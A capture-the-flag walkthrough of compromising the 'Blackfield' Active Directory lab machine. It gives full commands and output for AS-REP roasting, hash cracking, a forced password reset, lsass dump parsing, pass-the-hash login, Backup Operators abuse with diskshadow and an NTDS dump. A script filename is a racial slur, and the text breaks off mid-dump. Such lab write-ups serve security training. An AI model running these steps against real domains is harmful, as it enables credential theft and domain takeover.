# Blackfield (10.10.10.192)

## NMAP ports scan

```terminal
# Nmap 7.94SVN scan initiated Thu Feb 22 12:41:07 2024 as: nmap -p- --open -sS --min-rate 5000 -n -Pn -oN ports.txt 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
5985/tcp open  wsman

# Nmap done at Thu Feb 22 12:41:33 2024 -- 1 IP address (1 host up) scanned in 26.59 seconds

```

## NMAP base scan

```terminal
# Nmap 7.94SVN scan initiated Thu Feb 22 12:40:26 2024 as: nmap -T4 -A -Pn -oN base_scan.txt 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.15s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-22 14:10:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-02-22T14:11:10
|_  start_date: N/A
|_clock-skew: 7h00m09s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   150.17 ms 10.10.14.1
2   150.27 ms 10.10.10.192

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 22 12:41:38 2024 -- 1 IP address (1 host up) scanned in 72.43 seconds

```

## SMB :

It was allowing no user and pass login but not listing the shares :

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled.png)

But using the guest account, I was able to list the shares :

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%201.png)

Connected using SMBCLIENT :

```terminal
smbclient -U 'guest' \\\\10.10.10.192\\"profiles$"
```

After listing those directory, it seems that there were all the users directories, So I used this cmd to put into this file :

```terminal
smbclient -U 'guest' \\\\10.10.10.192\\"profiles$" -c ls > raw.txt 
```

Output

```terminal
❯ smbclient -U 'guest' \\\\10.10.10.192\\"profiles$" -c ls                                                                                                                  
Password for [WORKGROUP\guest]:                                                                                                                                             
  .                                   D        0  Wed Jun  3 22:17:12 2020                                                                                                  
  ..                                  D        0  Wed Jun  3 22:17:12 2020                                                                                                  
  AAlleni                             D        0  Wed Jun  3 22:17:11 2020                                                                                                  
  ABarteski                           D        0  Wed Jun  3 22:17:11 2020                                                                                                  
  ABekesz                             D        0  Wed Jun  3 22:17:11 2020                                                                                                  
  ABenzies                            D        0  Wed Jun  3 22:17:11 2020                                                                                                  
  ABiemiller                          D        0  Wed Jun  3 22:17:11 2020                                                                                                  

<SNIP>  
          
  ZTimofeeff                          D        0  Wed Jun  3 22:17:12 2020
  ZWausik                             D        0  Wed Jun  3 22:17:12 2020       
```

Using regex I sorted this list and put the valid userlist.

```terminal
cat raw.txt | grep D | awk '{print $1}' > users.txt
```

Using kerbrute found the list of valid users :

```terminal
❯ kerbrute userenum -d BLACKFIELD.local --dc 10.10.10.192 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/22/24 - Ronnie Flathers @ropnop

2024/02/22 12:54:54 >  Using KDC(s):
2024/02/22 12:54:54 >   10.10.10.192:88

2024/02/22 12:55:15 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2024/02/22 12:57:12 >  [+] support has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$support@BLACKFIELD.LOCAL:9bc77f492e1dd61a7731af1131cec9fe$c8d8744733edd7e30aa33b6f0245641b882ce9efc8c533767e6edf7751a27c7a16f05aa513bae4d2579db7913d4da8c5f938a6a0aafda6b8680e109cdf75ab06136ac397af7afea40007eb5a149c477db5be6a2eece1c2e84b3384ddf4858f4dba1fb8670ec63b5bf7e578669ebf6da9bdc4edc924c892943b165e982056fb65a209d796fe4936c1c88559ba13b0466029595e7ba2a5c214067de94f513afb2ae384c9ca9808910566354c32870b65536f59949113cda1ee0e08f63aaeda8736962a210aaa35d852a6012fce16888a449e684c3a9f4ce4efc7865fddf980b54c91e2f665eb2a04342aeb934b064a61c94a55d564b38fc697c4ac8c167ead3f249db849dce63a0977
2024/02/22 12:57:12 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2024/02/22 12:57:17 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2024/02/22 12:57:44 >  Done! Tested 314 usernames (3 valid) in 169.677 seconds

```

3/314 are valid and `support` has no pre auth required, that means we can asreproast that users.

Using impackets [`GetNPUsers.py`](http://GetNPUsers.py) 

```terminal
❯ GetNPUsers.py BLACKFIELD.local/support -dc-ip 10.10.10.192  

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

Password:
[*] Cannot authenticate support, getting its TGT
$krb5asrep$23$support@BLACKFIELD.LOCAL:d73a22da4b248f2c06e6c8e785011fff$8e7bc8e9b4cd69dc2fe7d624ff56abafba01afc97772bd8d3d7019a3a9d2fd3070b865cc3a154a52a041e635669a964479d0
3078a78f4603416fb0e0dbc0af5de38e538f0ccf47a20b8c87bb1d851ea3be558de71dc89e24294ced0422a1654dce45179f1108b0dc5f141a905163e49d062084cbd51ad1232f1c3c9db201b37798a68084823ca28a
43c2a57edd311a1a48f05d5715dbdb2394406856e1338e13d250c90621578918c3893e80fe299fb509a486346a8e4b34fea2513fac7c79ad683406eeec7ccb45c39897072c9d56a086eb48e5183f6bf3bb8b49edcca7
b7c4180d7c67f4f481377b29122cadd903a3288e88e8
```

Using Hashcat to crack those hashes .

```terminal
> hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt                         
hashcat (v6.2.6) starting          
                                                                                      
OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-11300H @ 3.10GHz, 2895/5854 MB (1024 MB allocatable), 8MCU
                                           
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256                                                                                                                            
                                                                                                                                                                            
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                         
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                
Rules: 1                                                                              

krb5asrep$23$support@BLACKFIELD.LOCAL:d73a22da4b248f2c06e6c8e785011fff$8e7bc8e9b4cd69dc2fe7d624ff56abafba01afc97772bd8d3d7019a3a9d2fd3070b865cc3a154a52a041e635669a964479d0
3078a78f4603416fb0e0dbc0af5de38e538f0ccf47a20b8c87bb1d851ea3be558de71dc89e24294ced0422a1654dce45179f1108b0dc5f141a905163e49d062084cbd51ad1232f1c3c9db201b37798a68084823ca28a
43c2a57edd311a1a48f05d5715dbdb2394406856e1338e13d250c90621578918c3893e80fe299fb509a486346a8e4b34fea2513fac7c79ad683406eeec7ccb45c39897072c9d56a086eb48e5183f6bf3bb8b49edcca7
b7c4180d7c67f4f481377b29122cadd903a3288e88e8:#00^BlackKnight                        
                                                                                                                                                                            
Session..........: hashcat
Status...........: Cracked                                                                                                                                                  
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:d73a22da4b24...8e88e8
Time.Started.....: Thu Feb 22 13:08:13 2024 (21 secs)
Time.Estimated...: Thu Feb 22 13:08:34 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   684.6 kH/s (2.90ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14336000/14344385 (99.94%)
Rejected.........: 0/14336000 (0.00%)
Restore.Point....: 14331904/14344385 (99.91%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: #1trav -> #!hrvert
Hardware.Mon.#1..: Util: 57%

Started: Thu Feb 22 13:08:12 2024
Stopped: Thu Feb 22 13:08:35 2024
```

We have our first set of valid credentials : `support:#00^BlackKnight`

```terminal
❯ cme smb 10.10.10.192 -u 'support' -p '#00^BlackKnight' --shares
SMB         10.10.10.192    445    DC01      Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01      +] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01      Enumerated shares
SMB         10.10.10.192    445    DC01      Share           Permissions     Remark
SMB         10.10.10.192    445    DC01      -----------     ------
SMB         10.10.10.192    445    DC01      ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01      C$                              Default share
SMB         10.10.10.192    445    DC01      forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01      IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01      NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01      profiles$       READ            
SMB         10.10.10.192    445    DC01      SYSVOL          READ            Logon server share 
```

## BloodHound

```terminal
❯ bloodhound-python -d BLACKFIELD.local -u support -p '#00^BlackKnight' -ns 10.10.10.192 -c all                                                                                               
INFO: Found AD domain: blackfield.local                                                                                                                                                       
INFO: Getting TGT for user                                                                                                                                                                    
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (blackfield.local:88)] [Errno -2] Name or service not known                          
INFO: Connecting to LDAP server: dc01.blackfield.local                                                                                                                                        
INFO: Found 1 domains                                                                                                                                                                         
INFO: Found 1 domains in the forest                                                                                                                                                           
INFO: Found 18 computers                                                                                                                                                                      
INFO: Connecting to LDAP server: dc01.blackfield.local                                                                                                                                        
INFO: Found 316 users                                                                                                                                                                         
INFO: Found 52 groups                                                                                                                                                                         
INFO: Found 2 gpos                                                                                                                                                                            
INFO: Found 1 ous                                                                                                                                                                             
INFO: Found 19 containers                                                                                                                                                                     
INFO: Found 0 trusts                                                                                                                                                                          
INFO: Starting computer enumeration with 10 workers                                                                                                                                           
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                                      
INFO: Querying computer:                                                                                                                                                    
INFO: Querying computer:    
INFO: Querying computer:                   
INFO: Querying computer:                                                                                                                                                    
INFO: Querying computer: 
INFO: Querying computer:                                                                                                                                                    
INFO: Querying computer: DC01.BLACKFIELD.local                                                                                                                              
INFO: Done in 00M 28S          
```

After analyzing through bloodhound and found that we can change the password of the user `audit2020`

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%202.png)

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%203.png)

To change the password of the user can use the following command :

```terminal
net rpc password "audit2020" "password@123" -U "Blackfield"/"support"%"#00^BlackKnight" -S "blackfield.local"
```

The command ran successfully, we can check it using cme

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%204.png)

Now we have access to `forensic` share.

Now I’m downloading all the files :

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%205.png)

In the memory_analysis directory there was a dump files.

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%206.png)

`lsass.zip` file was interesting, so I transferred it to my device using `smbclient.py` 

```terminal
❯ smbclient.py audit2020:'password@123'@10.10.10.192                                            

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation          
                                                                                                                                                                                              
Type help for list of commands                                                                 
# use forensic                                                                                                                                                                                
# cd memory_analysis                                                                                                                                                                          
# ls                                                                                           
drw-rw-rw-          0  Fri May 29 01:59:24 2020 .                                                                                                                                             
drw-rw-rw-          0  Fri May 29 01:59:24 2020 ..                                             
-rw-rw-rw-   37876530  Fri May 29 01:59:24 2020 conhost.zip                                                                                                                                   
-rw-rw-rw-   24962333  Fri May 29 01:59:24 2020 ctfmon.zip                                     
-rw-rw-rw-   23993305  Fri May 29 01:59:24 2020 dfsrs.zip                                                                                                                                     
-rw-rw-rw-   18366396  Fri May 29 01:59:24 2020 dllhost.zip                                    
-rw-rw-rw-    8810157  Fri May 29 01:59:24 2020 ismserv.zip
-rw-rw-rw-   41936098  Fri May 29 01:59:24 2020 lsass.zip
-rw-rw-rw-   64288607  Fri May 29 01:59:24 2020 mmc.zip                                                                                                                                       
-rw-rw-rw-   13332174  Fri May 29 01:59:24 2020 RuntimeBroker.zip
-rw-rw-rw-  131983313  Fri May 29 01:59:24 2020 ServerManager.zip
-rw-rw-rw-   33141744  Fri May 29 01:59:24 2020 sihost.zip
-rw-rw-rw-   33756344  Fri May 29 01:59:24 2020 smartscreen.zip
-rw-rw-rw-   14408833  Fri May 29 01:59:24 2020 svchost.zip
-rw-rw-rw-   34631412  Fri May 29 01:59:24 2020 taskhostw.zip
-rw-rw-rw-   14255089  Fri May 29 01:59:24 2020 winlogon.zip
-rw-rw-rw-    4067425  Fri May 29 01:59:24 2020 wlms.zip
-rw-rw-rw-   18303252  Fri May 29 01:59:24 2020 WmiPrvSE.zip
# get lsass.zip
# exit
```

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%207.png)

Then analyzed the file with `pypykatz`

```terminal
❯ pypykatz lsa minidump lsass.DMP                                                                                                                                                             
INFO:pypykatz:Parsing file lsass.DMP                                                                                                                                                          
FILE: ======== lsass.DMP =======                                                                                                                                                              
== LogonSession ==                                                                                                                                                                            
authentication_id 406458 (633ba)                                                                                                                                                              
session_id 2                                                                                                                                                                                  
username svc_backup                                                                                                                                                                           
domainname BLACKFIELD                                                                                                                                                                         
logon_server DC01                                                                                                                                                                             
logon_time 2020-02-23T18:00:03.423728+00:00                                                                                                                                                   
sid S-1-5-21-4194615774-2175524697-3563712290-1413                                                                                                                                            
luid 406458                                                                                                                                                                                   
        == MSV ==                                                                                                                                                                             
                Username: svc_backup                                                                                                                                                          
                Domain: BLACKFIELD                                                                                                                                                            
                LM: NA                                                                                                                                                                        
                NT: 9658d1d1dcd9250115e2205d9f48400d                                                                                                                                          
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef621
        == WDIGEST [633ba]==
                username svc_backup
                domainname BLACKFIELD
                password None              
                password (hex)                                                                 
        == Kerberos ==
                Username: svc_backup
                Domain: BLACKFIELD.LOCAL
        == WDIGEST [633ba]==      
                username svc_backup
                domainname BLACKFIELD                                                          
                password None                                                                  
                password (hex)                                                                 
                                               
== LogonSession ==                 
authentication_id 365835 (5950b)
session_id 2
username UMFD-2
domainname Font Driver Host
logon_server 
............................<SNIP>.............................
```

I tried Administrator hash but it was not valid but svc_backup hash worked.

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%208.png)

Using `evil-winrm` to connect to the target, and fetched the flag

```terminal
evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%209.png)

SVC_BACKUP is a part of `Backup operators` Groups.

![Untitled](Blackfield%20(10%2010%2010%20192)%20bbea2d11d4634242882929b25f8b6d5a/Untitled%2010.png)

Abusing the Backup Operators Groups :

```terminal
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> diskshadow /s nigga.dsh                                                                    
Microsoft DiskShadow version 1.0                                                                                                       
Copyright (C) 2013 Microsoft Corporation                                                                                                                                                      
On computer:  DC01,  2/22/2024 11:31:26 AM                                                     
                                                                                               
-> set verbose on                                                                                                                                                                             
-> set metadata C:\Windows\Temp\meta.cab                                                       
-> set context clientaccessible                                                                                                                                                                                                                                                
-> set context persistent                                                                      
-> begin backup                                                                                
-> add volume C: alias cdrive                                                                  
-> create                                                                                                                                                                                                                                                                      
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.
Component "\BCD\BCD" from writer "ASR Writer" is excluded from backup,                                                                 
because it requires volume  which is not in the shadow copy set.                               
The writer "ASR Writer" is now entirely excluded from the backup because the top-level                                                                                                        
non selectable component "\BCD\BCD" is excluded.                                               
                                                                                                                                                                                              
* Including writer "Task Scheduler Writer":                                                              
        + Adding component: \TasksStore                                                                                                                                                                                                                                        
                                                                                                                                       
* Including writer "VSS Metadata Store Writer":                                                                                        
        + Adding component: \WriterMetadataStore                                                                                       
                                                                                                                                                                                                                                                                               
* Including writer "Performance Counters Writer":                                                                                      
        + Adding component: \PerformanceCounters                                               
                                                                                               
* Including writer "System Writer":                                                            
        + Adding component: \System Files                                                                                                                                                     
        + Adding component: \Win32 Services Files                                              
                                                                                               
* Including writer "WMI Writer":                                                               
        + Adding component: \WMI                                                               
                                                                                               
* Including writer "DFS Replication service writer":
        + Adding component: \SYSVOL\B0E5E5E5-367C-47BD-8D81-52FF1C8853A7-A711151C-FA0B-40DD-8BDB-780EF9825004

* Including writer "Registry Writer":                                                          
        + Adding component: \Registry                                                          

* Including writer "NTDS":                                                                     
        + Adding component: \C:_Windows_NTDS\ntds

* Including writer "COM+ REGDB Writer":                                                        
        + Adding component: \COM+ REGDB                                                        

Alias cdrive for shadow ID {701f4ad6-6311-4a21-8c40-8bb870c6e4a8} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {80e4e3cd-e558-4442-aa84-efe91a291140} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab                                                  
Inserted file WM1.xml into .cab file meta.cab                                                  
Inserted file WM2.xml into .cab file meta.cab                                                  
Inserted file WM3.xml into .cab file meta.cab                                                  
Inserted file WM4.xml into .cab file meta.cab                                                  
Inserted file WM5.xml into .cab file meta.cab                                                  
Inserted file WM6.xml into .cab file meta.cab                                                  
Inserted file WM7.xml into .cab file meta.cab                                                  
Inserted file WM8.xml into .cab file meta.cab                                                  
Inserted file WM9.xml into .cab file meta.cab                                                  
Inserted file WM10.xml into .cab file meta.cab                                                 
Inserted file Dis248.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {80e4e3cd-e558-4442-aa84-efe91a291140}

        * Shadow copy ID = {701f4ad6-6311-4a21-8c40-8bb870c6e4a8}               %cdrive%
                - Shadow copy set: {80e4e3cd-e558-4442-aa84-efe91a291140}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\] 
                - Creation time: 2/22/2024 11:31:39 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed                                                                  
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1                                                              
-> expose %cdrive% E:                                                                          
-> %cdrive% = {701f4ad6-6311-4a21-8c40-8bb870c6e4a8}
The shadow copy was successfully exposed as E:\.
-> end backup                                                                                  
-> exit  
```

Then I downloaded both `ntds.dit` file and `system.hive`

Using [secretsdump.py](http://secretsdump.py) to crack the hash.

```terminal
> secretsdump.py -ntds ntds.dit -system SYSTEM.SAV -hashes lmhash:nthash LOCAL

Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:1386dd3d19cca2c3af1052ac6257b0d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:6de00c52dbabb0e95c074e3006fcf36e:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
................................<SNIP>..............................
BLACKFIELD.local\BLACKFIELD532412:1409:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD996878:1410:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD653097:1411:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\BLACKFIELD438814:1412:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
svc_backup:1413:aad3b435b51404eeaad3b435b51404ee:9658d1d1dcd9250115e2205d9f48400d:::
BLACKFIELD.local\lydericlefebvre:1414:aad3b435b51404eeaad3b435b51404ee:a2bc62c44415e12302885d742b0a6890:::
PC01$:1415:aad3b435b51404eeaad3b435b51404ee:de1e7748b6b292bfff4fd5adb54b4608:::
PC02$:1416:aad3b435b51404eeaad3b435b51404ee:9cd62550f6042af1d85b38f608edef7a:::
PC03$:1417:aad3b435b51404eeaad3b435b51404ee:86f46da5167729c9e258b63daa2eb299:::
PC04$:1418:aad3b435b51404eeaad3b435b51404ee:1b8af9e72f9bd07af393f824a75bb65b:::
PC05$:1419:aad3b435b51404eeaad3b435b51404ee:897a3aa7ce0d53ef1402be63105440a9:::
PC06$:1420:aad3b435b51404eeaad3b435b51404ee:91eeb06d11d82cb6d745f11af78ed9f6:::
PC07$:1421:aad3b435b51404eeaad3b435b51404ee:c0f006c96344a09e6c124df4b953a946:::
PC08$:1422:aad3b435b51404eeaad3b435b51404ee:cd4a9354602e28b34906e0d5cc55124a:::
PC09$:1423:aad3b435b51404eeaad3b435b51404ee:c1fa1cce0fc36e357677478dc4cbfb1d:::
PC10$:1424:aad3b435b51404eeaad3b435b51404ee:9526e0338897f4f124b48b208f914edc:::
PC11$:1425:aad3b435b51404eeaad3b435b51404ee:08453b2b98a2da1599e93ec639a185f8:::
PC12$:1426:aad3b435b51404eeaad3b435b51404ee:8c2548fa91bdf0ebad60d127d54e82c1:::
PC13$:1427:aad3b435b51404eeaad3b435b51404ee:5b3468bd451fc7e6efae47a5a21fb0f4:::
SRV-WEB$:1428:aad3b435b51404eeaad3b435b51404ee:48e7b5032d884aed3a64ba6d578bbfbc:::
SRV-FILE$:1429:aad3b435b51404eeaad3b435b51404ee:6e46f924ac2066e3d6c594262b969535:::
SRV-EXCHANGE$:1430:aad3b435b51404eeaad3b435b51404ee:93d9144d68086d3b94907107e928b961:::
SRV-INTRANET$:1431:aad3b435b51404eeaad3b435b51404ee:e9d6ae78b303e80c7ea724a2ccf28c51:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1
DC01$:aes256-cts-hmac-sha1-96:c09555ed7472a04a1f72bf40fe72b8b244c2ded0b8dc0b4c5eec23cf03b3213d
DC01$:aes128-cts-hmac-sha1-96:0e2260adbfcaf27d9ace96e65153fb24
DC01$:des-cbc-md5:c45ba75129b93e08
krbtgt:aes256-cts-hmac-sha1-96:bd31681b175bd44ddf68c064445ca4e510ba2115e106905bdfef6ef0ff66b32c
krbtgt:aes128-cts-hmac-sha1-96:676f63c263b8d482b271d091b2dde762
krbtgt:des-cbc-md5:fb4cb5761aef465d
audit2020:aes256-cts-hmac-sha1-96:0638a1e4f39c47653247e5207fd725f5aba8de8b2c8fe3231eb2ee14f35887f6
audit2020:aes128-cts-hmac-sha1-96:0498a4e20c2c0436df209e7d2b4f424f
audit2020:des-cbc-md5:04268ca7a1152ccb
support:aes256-cts-hmac-sha1-96:74574c46cab866ba40841f83b1226d429f6338fdf574f9a232ef551f9b7550c9
support:aes128-cts-hmac-sha1-96:19331e579612b1eb3356e8b5f0e2d890
support:des-cbc-md5:dfae341cef208f52
BLACKFIELD.local\BLACKFIELD764430:aes256-cts-hmac-sha1-96:7dcefd1338c5bcddd117c45a0b82fde8b8cd8353dd11933cfe258648d5ad0b35
BLACKFIELD.local\BLACKFIELD764430:aes128-cts-hmac-sha1-96:fadca38b7a1018e7b399ca49dec883f1
..............<SNIP>.....................
svc_backup:aes256-cts-hmac-sha1-96:20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
svc_backup:aes128-cts-hmac-sha1-96:139276fff0dcec3c349cb8b563691d06
svc_backup:des-cbc-md5:981a38735d7c32d6
BLACKFIELD.local\lydericlefebvre:aes256-cts-hmac-sha1-96:82e6a43bb06f136b82894d444d6d877247bc2c7739661474c8a6de61779f7446
BLACKFIELD.local\lydericlefebvre:aes128-cts-hmac-sha1-96:5240eb187f56791949a6b5dd6d701647
BLACKFIELD.local\lydericlefebvre:des-cbc-md5:134a986da801c85d
PC01$:aes256-cts-hmac-sha1-96:2ab654a0d622b58a26eccc0bd3bfefac1229740a662e3f28218188961c05c338
PC01$:aes128-cts-hmac-sha1-96:b907be19da08ea29a4b08bf332242308
PC01$:des-cbc-md5:7f10169d5d94f4ad
PC02$:aes256-cts-hmac-sha1-96:f192ef5f1f01d15461430347252bb5c265b3cda8d9b576408e6d1142e091ad61
PC02$:aes128-cts-hmac-sha1-96:b0a46a82f0f2633fbb939c87d65cb806
PC02$:des-cbc-md5:8652d5e94a0d5710
PC03$:aes256-cts-hmac-sha1-96:0eb6bee6a0857e06121b691fdc9342af71784a48490c72b19b53fd03e051a93b
PC03$:aes128-cts-hmac-sha1-96:b6381d242582d1f855113f8b72676736
PC03$:des-cbc-md5:235ea8261538add6
PC04$:aes256-cts-hmac-sha1-96:30cb9e83e597fc98559f5b7cca79e7fd17fea6931a748ed4de94ad88f79212c6
PC04$:aes128-cts-hmac-sha1-96:dafc3d95e41801a6e1f2a30fd932013e
PC04$:des-cbc-md5:1a16542aa86704e3
PC05$:aes256-cts-hmac-sha1-96:1dba69f739ba6a609f8df979d90ae59df616f7f8127585b92afedb21aa212501
PC05$:aes128-cts-hmac-sha1-96:e1205fdaa1131901720be105961aa239
PC05$:des-cbc-md5:9badf14f156ef8bf
PC06$:aes256-cts-hmac-sha1-96:a120444b408016aa373fb8bba058f814869f6e56035e3cf56c46c9aaed0347ff
PC06$:aes128-cts-hmac-sha1-96:45cab44ee0d77727a6f4385392af0343
PC06$:des-cbc-md5:9ee392d349c2fba1
PC07$:aes256-cts-hmac-sha1-96:c16abbc36ac90d4494a4978edbec0d6771b4c16ebea4de6f9c542a2f4d1990e8
PC07$:aes128-cts-hmac-sha1-96:c2a17876db049baff303d6de3b243fe4
PC07$:des-cbc-md5:a23e2c430e516119
PC08$:aes256-cts-hmac-sha1-96:75639f6fb140359edb164f2f658ad98f956b00b6db7792dc34231ec2d9ab58a4
